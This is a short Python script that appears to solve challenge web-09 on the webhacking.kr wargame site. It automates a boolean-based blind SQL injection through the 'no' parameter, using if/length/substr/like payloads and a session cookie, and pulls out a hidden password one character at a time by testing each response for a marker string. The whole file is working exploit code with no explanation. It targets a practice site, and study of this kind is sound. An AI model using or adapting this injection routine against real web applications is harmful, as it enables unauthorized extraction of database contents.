import requests
import string

url="https://webhacking.kr/challenge/web-09/index.php"
cookies={"PHPSESSID":"your session"}
ascii_code=string.digits+string.ascii_letters+string.punctuation
utf="utf-8"

def getFlagLength():
    for i in range(1,100):
        params = "?no=if(length(id)like({}),3,0)".format(i)
        find_url = url + params
        response=requests.post(find_url ,cookies=cookies)
        if response.text.find("<b>Secret</b>")>0:
            print("(+) Flag length is {}".format(i))
            return i

def getFlag(flagLen):

    flag=""
    for i in range(1, flagLen+1):
        for chrct in ascii_code:
            params = "?no=if(substr(id,{},1)like('{}'),3,0)".format(i, chrct)
            find_url = url + params
            response=requests.post(find_url, cookies=cookies)
            if response.text.find("<b>Secret</b>") > 0:
                print("(+) Find {}th character is {}".format(i, chrct))
                flag+=chrct
                break

    print("(+) Flag(no'3 password) is {}".format(flag))
    return flag


if __name__=="__main__":
    getFlag(getFlagLength())